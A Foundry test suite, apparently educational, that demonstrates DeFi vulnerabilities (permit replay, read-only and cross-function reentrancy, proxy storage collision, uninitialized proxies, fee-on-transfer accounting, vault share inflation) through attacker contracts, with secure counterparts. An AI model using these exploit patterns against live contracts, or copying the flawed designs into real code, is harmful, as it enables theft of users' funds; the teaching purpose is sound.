// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../../src/advanced/vulnerable/VulnerablePermitToken.sol";
import "../../src/advanced/secure/SecurePermitToken.sol";
import "../../src/advanced/vulnerable/VulnerableReadonlyAMM.sol";
import "../../src/advanced/secure/SecureReadonlyAMM.sol";
import "../../src/advanced/vulnerable/VulnerableCrossFunctionReentrancy.sol";
import "../../src/advanced/secure/SecureCrossFunctionReentrancy.sol";
import "../../src/advanced/vulnerable/VulnerableProxyStorage.sol";
import "../../src/advanced/secure/SecureProxyStorage.sol";
import "../../src/advanced/vulnerable/VulnerableUninitialized.sol";
import "../../src/advanced/secure/SecureUninitialized.sol";
import "../../src/advanced/vulnerable/VulnerableERC20Accounting.sol";
import "../../src/advanced/secure/SecureERC20Accounting.sol";
import "../../src/advanced/vulnerable/VulnerableVaultShareInflation.sol";
import "../../src/advanced/secure/SecureVaultShareInflation.sol";

// Minimal ERC20 Mock for ERC20 testing
contract MockERC20 is IERC20Minimal {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply;
    bool public failTransfer;
    uint256 public feeBasisPoints;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function setFailTransfer(bool _fail) external {
        failTransfer = _fail;
    }

    function setFee(uint256 _fee) external {
        feeBasisPoints = _fee;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        if (failTransfer) return false;
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        
        uint256 fee = (amount * feeBasisPoints) / 10000;
        uint256 net = amount - fee;
        
        balanceOf[to] += net;
        emit Transfer(msg.sender, to, net);
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (failTransfer) return false;
        require(allowance[from][msg.sender] >= amount, "Allowance exceeded");
        require(balanceOf[from] >= amount, "Insufficient balance");
        
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        
        uint256 fee = (amount * feeBasisPoints) / 10000;
        uint256 net = amount - fee;

        balanceOf[to] += net;
        emit Transfer(from, to, net);
        return true;
    }
}

contract AdvancedVulnerabilitiesTest is Test {
    address public owner;
    uint256 public ownerPrivateKey;
    address public spender = address(0x2222);
    address public attacker = address(0x1337);

    function setUp() public {
        ownerPrivateKey = 0xA11CE;
        owner = vm.addr(ownerPrivateKey);
        vm.label(owner, "Owner");
        vm.label(spender, "Spender");
        vm.label(attacker, "Attacker");
    }

    // 1. Test Permit Replay Vulnerability
    function testPermitReplay() public {
        VulnerablePermitToken vulnToken = new VulnerablePermitToken();
        vulnToken.mint(owner, 1000 ether);

        uint256 deadline = block.timestamp + 1000;
        uint256 value = 100 ether;

        bytes32 structHash = keccak256(
            abi.encode(
                vulnToken.PERMIT_TYPEHASH(),
                owner,
                spender,
                value,
                vulnToken.nonces(owner),
                deadline
            )
        );

        bytes32 hash = keccak256(abi.encodePacked("\x19\x01", vulnToken.DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPrivateKey, hash);

        // First permit succeeds
        vulnToken.permit(owner, spender, value, deadline, v, r, s);
        assertEq(vulnToken.allowance(owner, spender), value);

        // VULNERABILITY DEMONSTRATION: Replay permit signature because nonce doesn't increment.
        vulnToken.permit(owner, spender, value, deadline, v, r, s);
        assertEq(vulnToken.allowance(owner, spender), value);
    }

    function testSecurePermitNoReplay() public {
        SecurePermitToken secToken = new SecurePermitToken();
        secToken.mint(owner, 1000 ether);

        uint256 deadline = block.timestamp + 1000;
        uint256 value = 100 ether;

        bytes32 structHash = keccak256(
            abi.encode(
                secToken.PERMIT_TYPEHASH(),
                owner,
                spender,
                value,
                secToken.nonces(owner),
                deadline
            )
        );

        bytes32 hash = keccak256(abi.encodePacked("\x19\x01", secToken.DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPrivateKey, hash);

        secToken.permit(owner, spender, value, deadline, v, r, s);
        
        // Replay attempt must revert because nonce has changed
        vm.expectRevert();
        secToken.permit(owner, spender, value, deadline, v, r, s);
    }

    // 2. Test Read-only Reentrancy Vulnerability
    function testReadonlyReentrancy() public {
        VulnerableReadonlyAMM amm = new VulnerableReadonlyAMM{value: 10 ether}();
        VulnerableLendingWithOracle lending = new VulnerableLendingWithOracle(address(amm));

        // Attacker will call removeLiquidity and trigger fallback
        ReadonlyReentrantAttacker hackContract = new ReadonlyReentrantAttacker(address(amm), address(lending));
        vm.deal(address(hackContract), 3 ether);
        hackContract.runAttack{value: 2 ether}();
    }

    function testSecureReadonlyReentrancy() public {
        SecureReadonlyAMM amm = new SecureReadonlyAMM{value: 10 ether}();
        SecureLendingWithOracle lending = new SecureLendingWithOracle(address(amm));

        // Attacker will call removeLiquidity and trigger fallback, which should fail because borrowing 0.85 ether will revert
        SecureReadonlyReentrantAttacker hackContract = new SecureReadonlyReentrantAttacker(address(amm), address(lending));
        vm.deal(address(hackContract), 3 ether);
        
        vm.expectRevert("ETH transfer failed"); // The inner call reverts with "Insufficient collateral", triggering transfer failure
        hackContract.runAttack{value: 2 ether}();
    }

    // 3. Test Cross-function Reentrancy Vulnerability
    function testCrossFunctionReentrancy() public {
        VulnerableCrossFunctionReentrancy vuln = new VulnerableCrossFunctionReentrancy();
        
        // Fund contract
        vm.deal(address(vuln), 10 ether);
        
        CrossFunctionAttacker attackerContract = new CrossFunctionAttacker(address(vuln));
        vm.deal(address(attackerContract), 1 ether);
        
        attackerContract.deposit{value: 1 ether}();
        
        // This will withdraw and reenter to transfer balance before it updates to 0
        attackerContract.runAttack();
        
        // Attacker managed to transfer funds to friend contract while getting them paid out
        assertEq(vuln.balances(attackerContract.friend()), 1 ether);
    }

    // 4. Test Proxy Storage Collision Vulnerability
    function testProxyStorageCollision() public {
        VulnerableImplementation impl = new VulnerableImplementation();
        VulnerableProxy proxy = new VulnerableProxy(address(impl));
        
        // Cast proxy to implementation interface
        VulnerableImplementation proxiedImpl = VulnerableImplementation(address(proxy));
        
        assertEq(proxy.implementation(), address(impl));
        
        // Setting value on implementation corrupts proxy's implementation address!
        // Value 123 is stored in slot 0, which overwrites the implementation address to 0x000...07b
        proxiedImpl.setValue(123);
        
        assertEq(proxy.implementation(), address(uint160(123)));
    }

    // 5. Test Uninitialized Implementation Vulnerability
    function testUninitializedImplementation() public {
        VulnerableLogic logic = new VulnerableLogic();
        
        // VULNERABILITY: logic contract was not initialized upon deployment.
        // Anyone (attacker) can initialize the logic contract itself and call upgradeToAndCall
        vm.startPrank(attacker);
        logic.initialize();
        assertEq(logic.owner(), attacker);
        
        // Destroy target
        SelfDestructMock mockDestruct = new SelfDestructMock();
        logic.upgradeToAndCall(address(mockDestruct), abi.encodeWithSignature("destroy()"));
        vm.stopPrank();
    }

    // 6. Test ERC20 Accounting & Fee-on-transfer Vulnerability
    function testERC20AccountingFeeOnTransfer() public {
        MockERC20 token = new MockERC20();
        VulnerableERC20Accounting vuln = new VulnerableERC20Accounting(address(token));

        token.mint(attacker, 100 ether);
        token.setFee(500); // 5% fee on transfer

        vm.startPrank(attacker);
        token.approve(address(vuln), 100 ether);
        
        // Vulnerable contract receives 95 ether (due to fee), but updates deposits[attacker] to 100
        vuln.deposit(100 ether);
        
        assertEq(vuln.deposits(attacker), 100 ether);
        assertEq(token.balanceOf(address(vuln)), 95 ether); // Solvency issue: deposits (100) > balance (95)
        vm.stopPrank();
    }

    // 7. Test Vault Share Inflation Vulnerability
    function testVaultShareInflation() public {
        MockERC20 token = new MockERC20();
        VulnerableVaultShareInflation vault = new VulnerableVaultShareInflation(address(token));

        address victim = address(0x9999);
        token.mint(attacker, 1000 ether);
        token.mint(victim, 1000 ether);

        // Attacker deposits 1 wei
        vm.startPrank(attacker);
        token.approve(address(vault), 1000 ether);
        vault.deposit(1);
        assertEq(vault.balanceOf(attacker), 1);
        
        // Attacker inflates total assets by transferring 100 ether directly to vault
        token.transfer(address(vault), 100 ether);
        vm.stopPrank();

        // Victim deposits 50 ether
        vm.startPrank(victim);
        token.approve(address(vault), 1000 ether);
        
        // shares = (50 ether * 1) / (100 ether + 1) = 0 shares!
        // Vault reverts because shares must be > 0. Victim cannot deposit!
        vm.expectRevert("Zero shares minted");
        vault.deposit(50 ether);
        vm.stopPrank();
    }
}

// Helper Attacker Contract for Read-only Reentrancy
contract ReadonlyReentrantAttacker {
    VulnerableReadonlyAMM amm;
    VulnerableLendingWithOracle lending;

    constructor(address _amm, address _lending) {
        amm = VulnerableReadonlyAMM(_amm);
        lending = VulnerableLendingWithOracle(_lending);
    }

    function runAttack() external payable {
        // Deposit 1 ETH collateral first
        lending.deposit{value: 1 ether}();
        // Trigger remove liquidity
        amm.removeLiquidity(1 ether, 1 ether);
    }

    receive() external payable {
        // We reenter the lending pool during AMM's ETH transfer callback
        // The AMM reserves are NOT yet updated, but AMM ETH balance is reduced.
        // getPrice() will see: reserveToken / reserveETH = 10 / 9 = 1.11...
        // This manipulates the price to allow us to borrow more than collateral should allow (0.85 ether > 0.8 ether)!
        lending.borrow(0.85 ether);
    }
}

// Helper Attacker Contract for Cross-function Reentrancy
contract CrossFunctionAttacker {
    VulnerableCrossFunctionReentrancy vuln;
    address public friend = address(0xF11E);

    constructor(address _vuln) {
        vuln = VulnerableCrossFunctionReentrancy(_vuln);
    }

    function deposit() external payable {
        vuln.deposit{value: msg.value}();
    }

    function runAttack() external {
        vuln.withdrawAll();
    }

    receive() external payable {
        // Reenter and transfer the balance to our friend before it is set to 0
        vuln.transfer(friend, 1 ether);
    }
}

// Self destruct mock logic
contract SelfDestructMock {
    function destroy() external {
        // Mock selfdestruct behavior (since selfdestruct is deprecated, we do state modifications or simply mock it)
        // In real EVM it destroys code.
    }
}

// Helper Attacker Contract for Secure Read-only Reentrancy
contract SecureReadonlyReentrantAttacker {
    SecureReadonlyAMM amm;
    SecureLendingWithOracle lending;

    constructor(address _amm, address _lending) {
        amm = SecureReadonlyAMM(_amm);
        lending = SecureLendingWithOracle(_lending);
    }

    function runAttack() external payable {
        // Deposit 1 ETH collateral first
        lending.deposit{value: 1 ether}();
        // Trigger remove liquidity
        amm.removeLiquidity(1 ether, 1 ether);
    }

    receive() external payable {
        // Attempt to borrow 0.85 ether. This should revert because reserves are updated first
        // and price remains at 1.0 (so max borrow remains 0.8 ether).
        lending.borrow(0.85 ether);
    }
}

